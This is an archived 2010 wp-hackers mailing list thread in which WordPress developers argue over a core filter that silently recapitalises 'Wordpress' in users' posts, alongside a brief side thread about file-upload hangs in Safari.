Honestly, this whole thread appalls me. I can't believe I am using software written by people who think that potentially breaking other people's sites is a minor thing they should be making jokes about. As if everybody crawls their own site for 404s after a 0.1 upgrade. Seriously? And no, the line on http://codex.wordpress.org/Version_3.0#Posts is far from enough information.

Nicolas

--
Nicolas Kuttler
wp at nkuttler.de

http://www.nkuttler.de
http://www.nicolaskuttler.de (deutsch)

From mikeschinkel at newclarity.net  Mon Jul  5 21:41:06 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 5 Jul 2010 17:41:06 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinY_21NNUBbITMYPamjTBvRR81qgKxBJhDBJJaN@mail.gmail.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
	<7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com>
	<002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>
	<AANLkTinY_21NNUBbITMYPamjTBvRR81qgKxBJhDBJJaN@mail.gmail.com>
Message-ID: <4E44CE79-9809-4814-95FC-B37F17CA99BE@newclarity.net>

Hi All,

I guess I'm the one to call out all the bikeshedding going on today...

-Mike


From harry at thedextrousweb.com  Mon Jul  5 21:49:16 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Mon, 5 Jul 2010 22:49:16 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <24678A4D-F674-4DE0-96DF-F3DA6DADE3EA@thisismyurl.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
	<4C31F6D9.4@mullenweg.com>
	<AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
	<24678A4D-F674-4DE0-96DF-F3DA6DADE3EA@thisismyurl.com>
Message-ID: <0CDA50E6-B26C-4F3F-A742-1F3038A9F3BC@thedextrousweb.com>

That seems like an excellent compromise to me.

--
Harry Metcalfe
07790 559 876
@harrym, @dextrousweb

Sent from my phone (please excuse any brevity!) 

On 5 Jul 2010, at 17:58, Christopher Ross <cross at thisismyurl.com> wrote:

> 
> On 2010-07-05, at 12:22 PM, Nathan Rice wrote:
> 
>>> People seem fundamentally uncomfortable with the idea of acceptable edge
>>> cases.
>>> 
>>> 
>> That may very well be true. But what also seems to be true is the fact that
>> people are fundamentally uncomfortable with the idea that their CMS might
>> alter their content, without opt-in consent.
> 
> I'm with you 100% on this Nathan. I think protecting the brand is great but altering content without permission is creepy and compare it to if Microsoft started altering words in a users Word doc without permission. 
> 
> Perhaps a better solution would be to add a spell check rule to the TinyMCE which annoys people into fixing it, rather than doing it behind their backs.
> __
> 
> Christopher Ross
> 
> Toronto      1 (416) 840-5828
> Fredericton 1 (506) 474-2708
> 
> http://christopherross.ca
> http://www.thisismyurl.com
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From cross at thisismyurl.com  Mon Jul  5 22:22:18 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Mon, 5 Jul 2010 19:22:18 -0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3220BD.4020501@mullenweg.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
Message-ID: <33D3D144-3F83-48B1-82D8-FFB98854A2C9@thisismyurl.com>


On 2010-07-05, at 3:13 PM, Matt Mullenweg wrote:

> If it helps, think of this as one of those quirks that you sometimes love, sometimes disagree with, but ultimately separates WordPress from the 1,000 other generic, soulless, un-opinionated CMSes that flood the market. We have made you a beautiful omelet, sorry about the eggs! Except not really sorry.

Changing the editorial content of a website without the permission of an author and breaking it in the process isn't a simple 'quirk', it demonstrated a dramatic disconnect between your core developers and the users of the platform. There's a fine line between being proud of something you've helped create and being viewed as arrogant by the lowly peasants who run it.

__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From info at toscho.de  Mon Jul  5 22:23:16 2010
From: info at toscho.de (Thomas Scholz)
Date: Tue, 06 Jul 2010 00:23:16 +0200
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3220BD.4020501@mullenweg.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
Message-ID: <op.vfd5s22hr6yny2@perplexifikator.speedport-w-303v-typ-a>

Matt Mullenweg:

> The "damage" the P function could do has already been done. People have  
> already fixed their sites if it broke anything. The sky did not fall.  
> The exact same function has been running on WP.com for several years.

Many people will upgrade from 2.9 to 3.0.1 and leave out the 3.0.0  
release. WP.com is not a reference for the rest of the web, where people  
have installed WP into a ?Wordpress? directory or have uploaded similar  
named images. The forum shows that already.

I wish you had just added this code to the plugin directory, without  
forcing anyone to opt *out*.

> If it helps, think of this as one of those quirks that you sometimes  
> love, sometimes disagree with, but ultimately separates WordPress from  
> the 1,000 other generic, soulless, un-opinionated CMSes that flood the  
> market.

I wonder what would happen if OpenSuse would implement such a filter. Or  
OpenOffice. :)
People were on fire, and they were right.

> We have made you a beautiful omelet, sorry about the eggs! Except not  
> really sorry.

Eggs are *necessary* for an omelet. That?s the difference. Why didn?t you  
talk about this before the commit? I cannot imagine that *you* are afraid  
of an open discussion.

Regards
Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de
0160/1764727

From kikizas at gmail.com  Mon Jul  5 22:35:25 2010
From: kikizas at gmail.com (Demetris)
Date: Tue, 6 Jul 2010 01:35:25 +0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3250B0.5070900@laptoptips.ca>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
Message-ID: <AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>

On Tue, Jul 6, 2010 at 12:37 AM, Andrew Ozz <admin at laptoptips.ca> wrote:
> I'm still being amazed by how a well meant effort to correct a common
> spelling mistake can be turned into a .... (insert your favourite conspiracy
> theory here).
>
> Grammatically "WordPress" is a name and "Wordpress" is the misspelled form
> of it. And that's in any language. You wouldn't type "Los angeles" or "San
> francisco", would you? Correcting the spelling _does not_ change the content
> or edit your post.
>
> And yes, unfortunately there isn't more straightforward way of correcting
> that spelling. It could be added to the TinyMCE dictionary (would need a
> fair bit of coding since it uses Google spell by default but can use
> aspell/pspell on the server too). The problem is that most people usually
> use the browser's build-in spellchecker and there's no way of adding this in
> there.
>
Andrew,

First, no one talks about a conspiracy.

Second, are you saying that WordPress should be correcting commonly
misspelled camelcased words?  Why stop with WordPress?s own name then?
 There is much work to be done on that front:

*   DaimlerChrysler
*   FedEx
*   iPad
*   iPhone
*   iPod
*   iWhatever
*   MasterCard
*   NVIDIA
*   PlayStation
*   YouTube
*   etc. etc.

Then, once we are finished with camelcased words, we can start
correcting capitalization in acronyms.  The situation there is even
worse.

These tasks will help us keep sufficiently busy for a few months now
that WordPress seems to have reached nearly perfect state and does not
need attention in any other areas.

:-D

Cheers!

Demetris
http://op111.net/76 ? See what is new in WordPress 3.0!

From mikeschinkel at newclarity.net  Mon Jul  5 22:39:54 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 5 Jul 2010 18:39:54 -0400
Subject: [wp-hackers] File Upload problems with Safari on Mac OS X?
Message-ID: <C14184B5-4C73-4868-83F6-EFE9E49AED78@newclarity.net>

Has anyone run into problems trying to upload files using Safari (and gotten around it?)

I'm creating a simple post metabox with an <input type="file"> and about 80% of the file Safari just hangs.  The code works fine in Chrome and Firefox and I've found some references to there being a bug in earlier versions of Safari.  

Anyone know if there is something I can do to solve this?

-Mike

From cross at thisismyurl.com  Mon Jul  5 22:44:31 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Mon, 5 Jul 2010 19:44:31 -0300
Subject: [wp-hackers] File Upload problems with Safari on Mac OS X?
In-Reply-To: <C14184B5-4C73-4868-83F6-EFE9E49AED78@newclarity.net>
References: <C14184B5-4C73-4868-83F6-EFE9E49AED78@newclarity.net>
Message-ID: <58C9B9FA-7BAE-4C6D-8815-8395DEC82AD4@thisismyurl.com>

Mike, I've had the same problem with Safari while using the Flash uploader but the problem is intermittent and defaulting back to the browser uploader has worked for me. I don't think it's related specifically to wordpress (ha! auto correct that) however as the flash plugin has been crashing off and on for a white now.

To be honest I assumed it was part of the Apple vs. Adobe throw down or a Safari 5 glitch.

c.


On 2010-07-05, at 7:39 PM, Mike Schinkel wrote:

> Has anyone run into problems trying to upload files using Safari (and gotten around it?)
> 
> I'm creating a simple post metabox with an <input type="file"> and about 80% of the file Safari just hangs.  The code works fine in Chrome and Firefox and I've found some references to there being a bug in earlier versions of Safari.  
> 
> Anyone know if there is something I can do to solve this?
> 
> -Mike


__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From mikeschinkel at newclarity.net  Mon Jul  5 22:48:56 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 5 Jul 2010 18:48:56 -0400
Subject: [wp-hackers] File Upload problems with Safari on Mac OS X?
In-Reply-To: <58C9B9FA-7BAE-4C6D-8815-8395DEC82AD4@thisismyurl.com>
References: <C14184B5-4C73-4868-83F6-EFE9E49AED78@newclarity.net>
	<58C9B9FA-7BAE-4C6D-8815-8395DEC82AD4@thisismyurl.com>
Message-ID: <6EEFCF73-21E0-4FAD-BB9E-58AFEDE4F7DD@newclarity.net>

Hi Christopher,

Thanks but I'm not using the Flash uploader, just a simple <input type="file">.   

And yes, it's not a WordPress problem "per se" but I thought maybe there was something WordPress could potentially be doing that gets in the way that I could correct.  At least I was hoping so and hoping for an easy answer.

-Mike
On Jul 5, 2010, at 6:44 PM, Christopher Ross wrote:

> Mike, I've had the same problem with Safari while using the Flash uploader but the problem is intermittent and defaulting back to the browser uploader has worked for me. I don't think it's related specifically to wordpress (ha! auto correct that) however as the flash plugin has been crashing off and on for a white now.
> 
> To be honest I assumed it was part of the Apple vs. Adobe throw down or a Safari 5 glitch.
> 
> c.
> 
> 
> On 2010-07-05, at 7:39 PM, Mike Schinkel wrote:
> 
>> Has anyone run into problems trying to upload files using Safari (and gotten around it?)
>> 
>> I'm creating a simple post metabox with an <input type="file"> and about 80% of the file Safari just hangs.  The code works fine in Chrome and Firefox and I've found some references to there being a bug in earlier versions of Safari.  
>> 
>> Anyone know if there is something I can do to solve this?
>> 
>> -Mike
> 
> 
> __
> 
> Christopher Ross
> 
> Toronto      1 (416) 840-5828
> Fredericton 1 (506) 474-2708
> 
> http://christopherross.ca
> http://www.thisismyurl.com
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Mon Jul  5 23:18:54 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 5 Jul 2010 19:18:54 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4E44CE79-9809-4814-95FC-B37F17CA99BE@newclarity.net>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com> 
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com> 
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com> 
	<7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com> 
	<002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>
	<AANLkTinY_21NNUBbITMYPamjTBvRR81qgKxBJhDBJJaN@mail.gmail.com> 
	<4E44CE79-9809-4814-95FC-B37F17CA99BE@newclarity.net>
Message-ID: <AANLkTikpfWamwPEyFi0IkDEV_82lBFb0MBu4BBF6GnZj@mail.gmail.com>

On Mon, Jul 5, 2010 at 5:41 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:
>
> I guess I'm the one to call out all the bikeshedding going on today...
>

+1.

I enjoy reading the various suggestions that the exact content you enter has
been treated as-is until this very point. Please remove the following
filters from your installs: emoticons, autop, shortcodes, texturize, special
characters, curly quotes, tag balancing, filtered HTML / kses, comment link
nofollows, and surely others. These filters trigger regular expressions that
are magnitudes more intensive, and every one of them is or has at one time
been prone to bugs and acceptable edge cases as a best case scenario, and a
giant security hole as the worst case.

As written by Andrew Ozz:

> I'm still being amazed by how a well meant effort to correct a common
> spelling mistake can be turned into a .... (insert your favourite conspiracy
> theory here).



Grammatically "WordPress" is a name and "Wordpress" is the misspelled form
> of it. And that's in any language. You wouldn't type "Los angeles" or "San
> francisco", would you? Correcting the spelling _does not_ change the content
> or edit your post.

From ravi-lists at g8o.net  Tue Jul  6 00:49:53 2010
From: ravi-lists at g8o.net (// ravi)
Date: Mon, 5 Jul 2010 20:49:53 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
Message-ID: <E6E97456-B3DD-4060-8F32-6383D3820A13@g8o.net>

On Jul 5, 2010, at 4:39 PM, Nathan Rice wrote:
> On Mon, Jul 5, 2010 at 4:31 PM, Harry Metcalfe <harry at thedextrousweb.com>wrote:
> 
>> Benevolent dictatorships are fine as long as they're benevolent. Using your
>> position to enforce you pedantries on my blog is not benevolent.
>> 
> 
> Speaking politically, the "benevolent dictator" is a mythical creature. Any
> benevolent man would never accept a dictatorship, and no dictator could ever
> remain benevolent.


Well put. (not intended as a comment/position on the current discussion).

	?ravi



From ravi-lists at g8o.net  Tue Jul  6 01:21:10 2010
From: ravi-lists at g8o.net (// ravi)
Date: Mon, 5 Jul 2010 21:21:10 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0015174c437cdb7544048aa91c21@google.com>
References: <0015174c437cdb7544048aa91c21@google.com>
Message-ID: <E40CA3A5-AE24-4A58-8A2C-3B233777A5DD@g8o.net>



I just wish someone would exert some dictatorial or other authority to make autop() behave and not mess with the content of shortcodes, and speaking of shortcodes, have them applied to feed text.

	?ravi


(figured this is a good thread to hijack for my pet peeve)


From aizat.faiz at gmail.com  Tue Jul  6 02:17:08 2010
From: aizat.faiz at gmail.com (Ezwan Aizat Bin Abdullah Faiz)
Date: Tue, 6 Jul 2010 10:17:08 +0800
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
Message-ID: <AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>

Just a thought, if you enter: iphone, or macbook into an iPhone, it will
correct it to its proper name.

On Tue, Jul 6, 2010 at 6:35 AM, Demetris <kikizas at gmail.com> wrote:

> On Tue, Jul 6, 2010 at 12:37 AM, Andrew Ozz <admin at laptoptips.ca> wrote:
> > I'm still being amazed by how a well meant effort to correct a common
> > spelling mistake can be turned into a .... (insert your favourite
> conspiracy
> > theory here).
> >
> > Grammatically "WordPress" is a name and "Wordpress" is the misspelled
> form
> > of it. And that's in any language. You wouldn't type "Los angeles" or
> "San
> > francisco", would you? Correcting the spelling _does not_ change the
> content
> > or edit your post.
> >
> > And yes, unfortunately there isn't more straightforward way of correcting
> > that spelling. It could be added to the TinyMCE dictionary (would need a
> > fair bit of coding since it uses Google spell by default but can use
> > aspell/pspell on the server too). The problem is that most people usually
> > use the browser's build-in spellchecker and there's no way of adding this
> in
> > there.
> >
> Andrew,
>
> First, no one talks about a conspiracy.
>
> Second, are you saying that WordPress should be correcting commonly
> misspelled camelcased words?  Why stop with WordPress?s own name then?
>  There is much work to be done on that front:
>
> *   DaimlerChrysler
> *   FedEx
> *   iPad
> *   iPhone
> *   iPod
> *   iWhatever
> *   MasterCard
> *   NVIDIA
> *   PlayStation
> *   YouTube
> *   etc. etc.
>
> Then, once we are finished with camelcased words, we can start
> correcting capitalization in acronyms.  The situation there is even
> worse.
>
> These tasks will help us keep sufficiently busy for a few months now
> that WordPress seems to have reached nearly perfect state and does not
> need attention in any other areas.
>
> :-D
>
> Cheers!
>
> Demetris
> http://op111.net/76 ? See what is new in WordPress 3.0!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://aizatto.com

From wp-hackers at striderweb.com  Tue Jul  6 02:40:27 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 5 Jul 2010 21:40:27 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikpfWamwPEyFi0IkDEV_82lBFb0MBu4BBF6GnZj@mail.gmail.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
	<7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com>
	<002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>
	<AANLkTinY_21NNUBbITMYPamjTBvRR81qgKxBJhDBJJaN@mail.gmail.com>
	<4E44CE79-9809-4814-95FC-B37F17CA99BE@newclarity.net>
	<AANLkTikpfWamwPEyFi0IkDEV_82lBFb0MBu4BBF6GnZj@mail.gmail.com>
Message-ID: <F16EDD48-45FC-47AE-990D-79ACBEC42DF7@striderweb.com>


On Jul 5, 2010, at 6:18 PM, Andrew Nacin wrote:

> Please remove the following
> filters from your installs: emoticons, autop, shortcodes, texturize, special
> characters, curly quotes, tag balancing, filtered HTML / kses, comment link
> nofollows, and surely others.

This is a Straw Man argument.  Those are mostly *formatting*, not content. They can be turned off in settings or by switching to HTML editor.  Short codes are almost certainly not used *without the author's knowledge*.

The only example I need is the absurdity that it is now impossible to use WordPress to write a post showing people the right and wrong way to capitalize the program's name.

Add it to spell check?  Great!  Just change it on the fly?  Don't like it at all.

The closest comparison I can think of is Microsoft Word's AutoCorrect function. That would actually be a very nice thing to add to WordPress, but note that in Word it's very easy to go into the AutoCorrect list and add/remove items from the correction list.

And no, saying "anyone can write a plugin that does it" isn't the answer.  It shouldn't require programming knowledge, or an entire plugin, to alter this behavior.

> As written by Andrew Ozz:
> 
>> I'm still being amazed by how a well meant effort to correct a common
>> spelling mistake can be turned into a .... (insert your favourite conspiracy
>> theory here).

Another Straw Man.  Nobody's claiming conspiracy.  I have no doubt that it was well intended, but it's a very bad precedent.  The Road to Hell and all that....

No doubt my little missive will not shift the Powers What Is, but I felt it should be said anyway.

Personally I think the **worst** thing to come of this is the attitude that the "higher ups" have shown towards the people who disagree with this change.  It comes off as arrogant, and acting as though the opinions of the "rank and file" contributors is unimportant in the face of your personal foibles is not a good way to grow or maintain the community -- and again, a very bad precedent to set.

-- 
Stephen

"Daddy?" I asked sweetly, "Are we lost?"
"Shut up," he explained

From wp-hackers at striderweb.com  Tue Jul  6 02:42:32 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 5 Jul 2010 21:42:32 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
Message-ID: <C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>


On Jul 5, 2010, at 9:17 PM, Ezwan Aizat Bin Abdullah Faiz wrote:

> Just a thought, if you enter: iphone, or macbook into an iPhone, it will
> correct it to its proper name.

As soon as the iPhone autocorrect dohickey pops up, you can say "don't do that" by tapping on it.  WordPress doesn't tell you it's making the change, nor allows you to stop it; it just does it.

Stephen

From mark at simplercomputing.net  Tue Jul  6 03:27:18 2010
From: mark at simplercomputing.net (Mark E)
Date: Mon, 05 Jul 2010 21:27:18 -0600
Subject: [wp-hackers] Fwd: Re:  Putting the P in WordPress
Message-ID: <4C32A296.8050807@simplercomputing.net>

Hey -

whatifiwanttowritesomethingsillylikethisinmywordpressblog?

I can't. I'd be overruled by the self-appointed grammar police. Unless I 
want to jump through some hoops first. WTH?

My perspective is leave other people's spelling mistakes alone unless 
they ask you to correct them. Freedom of express and all that.

If you want to introduce a function like that then make it OPT-IN via a 
checkbox.


Mark

From mark at simplercomputing.net  Tue Jul  6 03:37:10 2010
From: mark at simplercomputing.net (Mark E)
Date: Mon, 05 Jul 2010 21:37:10 -0600
Subject: [wp-hackers] Putting the P in WordPress
Message-ID: <4C32A4E6.10507@simplercomputing.net>

On 07/05/2010 02:40 PM, Harry Metcalfe wrote:
> It's true, I can :)
>
> But most can't and I think it's an important point of principle that WP shouldn't make editorial changes.

I can barely fathom how somebody dreamed up the need to put this
function into WordPress. That has to be one of the most self-important
things I've ever seen in open source software.

Mark

From umassthrower at gmail.com  Tue Jul  6 03:46:48 2010
From: umassthrower at gmail.com (Jeff Jason)
Date: Mon, 5 Jul 2010 23:46:48 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com> 
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com> 
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com> 
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
Message-ID: <AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>

You mean there is a mechanism for opting out of what the creator chose to be
the default behavior.

If only there was a mechanism (
http://wordpress.org/extend/plugins/remove-wordpress-to-wordpress-filter/)
for opting out of what the creator decided would be the default behavior in
WP.  Ohh wait.

In any event.

Reading this thread, I originally came down on the side of this is a foolish
filter.  This is turning into a real silly argument.  There are many reasons
why the Wordpress --> WordPress filter wasn't the best idea.  But the fact
of the matter is the filter is in and there is even a plugin to remove it.
 Opt-in/Opt-out, who cares.  It only messes with the specific string
"Wordpress" anyways, it doesn't do anything to wordpress or WoRdPrEsS.  The
only instances where anyone should have been affected is where they made the
mistake of mistyping or misspelling the *trademark*.

Why don't people care a little more about implementation and design
decisions that actually matter.



On Mon, Jul 5, 2010 at 10:42 PM, Stephen Rider <wp-hackers at striderweb.com>wrote:

>
> On Jul 5, 2010, at 9:17 PM, Ezwan Aizat Bin Abdullah Faiz wrote:
>
> > Just a thought, if you enter: iphone, or macbook into an iPhone, it will
> > correct it to its proper name.
>
> As soon as the iPhone autocorrect dohickey pops up, you can say "don't do
> that" by tapping on it.  WordPress doesn't tell you it's making the change,
> nor allows you to stop it; it just does it.
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeff Jason II

From Bulk at thecodecave.com  Tue Jul  6 04:19:10 2010
From: Bulk at thecodecave.com (Brian Layman)
Date: Tue, 6 Jul 2010 00:19:10 -0400
Subject: [wp-hackers] Fwd: Re:  Putting the P in WordPress
In-Reply-To: <4C32A296.8050807@simplercomputing.net>
References: <4C32A296.8050807@simplercomputing.net>
Message-ID: <000a01cb1cc2$63c948c0$2b5bda40$@thecodecave.com>



-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mark E
Sent: Monday, July 05, 2010 11:27 PM
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Fwd: Re: Putting the P in WordPress

Hey -

> whatifiwanttowritesomethingsillylikethisinmywordpressblog?
> I can't. I'd be overruled by the self-appointed grammar police. Unless I
want to jump through some hoops first. WTH?

Just for the record, you could. 
The plugin only updates the ONE most spelling of the word. If someone was
writing Wordpress it would be changed to WordPress. If someone typed
wordpress, it would be left alone.


From m at mullenweg.com  Tue Jul  6 04:19:44 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 00:19:44 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
Message-ID: <4C32AEE0.5070803@mullenweg.com>

On 7/5/2010 11:46 PM, Jeff Jason wrote:
> Why don't people care a little more about implementation and design
> decisions that actually matter.

You're completely right. The more trivial the topic, the more people 
likely to have an opinion, because it's easier to do so.

The fundamental flaw of mailing lists, and arguments like this thread, 
is that they come to be dominated in volume by the people who have the 
most time to post to them.

As I said before, you are in /complete control/ of your site. It's a 
single line to remove a filter. If you don't like the filter, vote with 
your feet or with a plugin. If the function cause a non-trivial number 
of people to avoid 3.0, leave WP, or install a plugin to deactivate I 
would seriously reconsider it. In the absence of that, there are a 1,001 
better places to focus my attention with regards to WordPress.

If someone made a better version of the function and benchmarked it next 
to the current or some of our other formatting functions in some 
real-world situations, that would be useful too, and add to the 
discussion rather than the noise. I'd love to see wp-hackers return to 
more, well, hacking.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From yojoaquin at gmail.com  Tue Jul  6 04:29:18 2010
From: yojoaquin at gmail.com (Joaquin Rodriguez Montero)
Date: Tue, 6 Jul 2010 01:29:18 -0300
Subject: [wp-hackers] Putting the P in WordPress
Message-ID: <AANLkTikFQgya9FRTQC2MzsMVX45ovxh5M3nSbv_9No2s@mail.gmail.com>

Suddenly wp-hackers list turned into wp-psychoanalysis.. what if we move
this discussion to http://wordpress.org/support/forum/4  (which accounts
for: Requests and Feedback <http://wordpress.org/support/forum/4> ? Feature
requests; *criticism*.)

I'll always care about you guys as you teach me a lot.

Best,

Chocks / Joaquin

From listswphackers at mist.org.uk  Tue Jul  6 07:14:41 2010
From: listswphackers at mist.org.uk (mrmist)
Date: Tue, 6 Jul 2010 08:14:41 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C32AEE0.5070803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
